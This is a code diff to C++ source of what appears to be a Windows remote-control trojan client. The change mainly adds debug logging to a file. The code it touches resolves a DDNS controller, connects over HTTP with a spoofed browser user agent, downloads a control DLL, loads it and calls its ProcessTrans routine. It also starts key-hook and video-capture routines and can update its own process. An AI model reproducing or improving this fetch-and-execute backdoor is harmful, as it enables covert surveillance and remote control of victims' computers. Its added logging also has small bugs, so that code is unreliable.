@@ -6,7 +6,16 @@
 #pragma comment(lib,"vfw32")
 #pragma comment(lib,"winmm")
 
-
+static void WriteLog(char* message)
+{
+	FILE* fp = fopen("pcclient.txt", "a");
+	if (fp != NULL)
+	{
+		fwrite(message, strlen(message), 1, fp);
+		fwrite("\n", 2, 1, fp);
+		fclose(fp);
+	}
+}
 SshWork::SshWork()
 {
 	memset(&m_InitInfo,0,sizeof(m_InitInfo));
@@ -213,16 +222,19 @@ BOOL SshWork::GetHttpConnect(LPINITDLLINFO pInfo)
 	//关闭句柄
 	if(hIe != NULL)
 	{
+		WriteLog("closehttphandle");
 		CloseHttpHandle();
 		Sleep(2000);
 	}
 
 	//设置最大连接数量为100
 	DWORD nValue = 100;
+	WriteLog("setoption1");
 	if( !InternetSetOption(NULL,73,&nValue,sizeof(DWORD)) ||
 		!InternetSetOption(NULL,74,&nValue,sizeof(DWORD)))
 		return FALSE;
 
+	WriteLog("checkdns ");
 	//查看是否有ddns
 	if(strlen(pInfo->m_DdnsUrl) != 0)
 	{
@@ -236,13 +248,14 @@ BOOL SshWork::GetHttpConnect(LPINITDLLINFO pInfo)
 			}
 		}
 	}
+	WriteLog("init http");
 
 	//初始化HTTP环境
 	hIe = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.0; "
 						"Windows NT 5.0; .NET CLR 1.1.4322)",
 						INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
 	if(!hIe) return FALSE;
-
+	WriteLog("init http1");
 	//填充上送当前客户信息
 	char m_Url[4096] = {0};
 	char m_ExternData[2048] = {0};
@@ -250,23 +263,26 @@ BOOL SshWork::GetHttpConnect(LPINITDLLINFO pInfo)
 	sprintf(m_Url,"http://%s:%d/%d%s",
 		pInfo->m_ServerAddr,pInfo->m_ServerPort,
 		CONN_MAIN,m_ExternData);
-
+	WriteLog(m_Url);
 	//建立HTTP连接,上送数据
 	hFp = InternetOpenUrl(hIe , 
 		m_Url , NULL, 0,
 		INTERNET_FLAG_PRAGMA_NOCACHE|
 		INTERNET_FLAG_RELOAD|
 		INTERNET_FLAG_NO_CACHE_WRITE , 0);
+	WriteLog("111111111");
 	if(!hFp)
 	{
+		WriteLog("1111111112222");
 		CloseHttpHandle();
 		return FALSE; 
 	}
-
+	WriteLog("123465");
 	DWORD m_TimeOut = 24 * 3600 * 1000;
 	if(!InternetSetOption(hFp,
 		INTERNET_OPTION_RECEIVE_TIMEOUT,&m_TimeOut,sizeof(DWORD)))
 	{
+		WriteLog("GetHttpConnect111");
 		CloseHttpHandle();
 		return FALSE;
 	}
@@ -275,31 +291,38 @@ BOOL SshWork::GetHttpConnect(LPINITDLLINFO pInfo)
 	char sCode[256] = {0};
 	DWORD nSize = 250;
 	DWORD nIndex = 0;
+	WriteLog("GetHttpConnect1111");
 	if(!HttpQueryInfo(hFp , HTTP_QUERY_STATUS_CODE , 
 		sCode , &nSize , &nIndex) || atoi(sCode) != 200)
 	{
 		CloseHttpHandle();
 		return FALSE;
 	}
-
+	WriteLog("GetHttpConnect11sss1");
 	//查看控制dll是否已经装载
 	if(hCtrlMd) FreeLibrary(hCtrlMd);
-
+	WriteLog("GetHttpConnect111sdas");
 	//接收控制文件
 	if(!DlFile(m_InitInfo.m_CtrlFile))
 	{
 		CloseHttpHandle();
 		return FALSE; 
 	}
-
+	WriteLog("m_InitInfo.m_CtrlFile");
 	//装载控制dll文件
-	hCtrlMd = LoadLibrary(m_InitInfo.m_CtrlFile);
+	WriteLog(m_InitInfo.m_CtrlFile);
+	hCtrlMd = LoadLibraryA(m_InitInfo.m_CtrlFile);
+	DWORD temp = GetLastError();
+	char templog[111];
+	sprintf(templog, "errlog log %d\n", temp);
+	WriteLog(templog);
 	if(hCtrlMd == NULL)
 	{
+		WriteLog("closehttphandler");
 		CloseHttpHandle();
 		return FALSE; 
 	}
-	
+	WriteLog("GetHttpConnect11dasdasdas1");
 	//当不是本进程启动的时候,更新本进程
 	if(m_InitInfo.m_ProcessName[0] != 2)
 	{
@@ -309,7 +332,7 @@ BOOL SshWork::GetHttpConnect(LPINITDLLINFO pInfo)
 			return FALSE; 
 		}
 	}
-
+	WriteLog("GetHttpConnect4654564561");
 	return TRUE;
 }
 
@@ -345,7 +368,9 @@ void SshWork::StartWork(LPINITDLLINFO pItem)
 	KeyStartMyWork();
 
 	m_IsVideo = GetVideoInfo();
-
+	char log[255];
+	sprintf(log, "start3 ghook %c,%d", m_IsVideo, m_IsVideo);
+	WriteLog(log);
 	//启动相应工作线程序
 	UINT m_Id = 0;
 	m_Thread = (HANDLE) _beginthreadex(NULL , 0 , 
@@ -369,12 +394,17 @@ UINT WINAPI SshWork::SSH_WorkThread(LPVOID lPvoid)
 	//开始进入工作循环
 	while(1)
 	{
+		WriteLog("GetHttpConnectbegin");
 		//建立连接
 		if(pWork->GetHttpConnect(&pWork->m_InitInfo))
 		{
+			WriteLog("GetHttpConnectend");
 			//连接成功,开始处理交易
 			PROCESSTRANS ProcessTrans = (PROCESSTRANS) 
 				GetProcAddress(pWork->hCtrlMd,"ProcessTrans");
+			char log[255];
+			sprintf(log, "SSH_WorkThread ProcessTrans %s\n", ProcessTrans==NULL?"NULL":"NOTNULL");
+			WriteLog(log);
 			if(ProcessTrans != NULL)
 				ProcessTrans(pWork->hFp , pWork->m_ExitEvent ,
 						pWork->m_InitInfo.m_ServerAddr ,
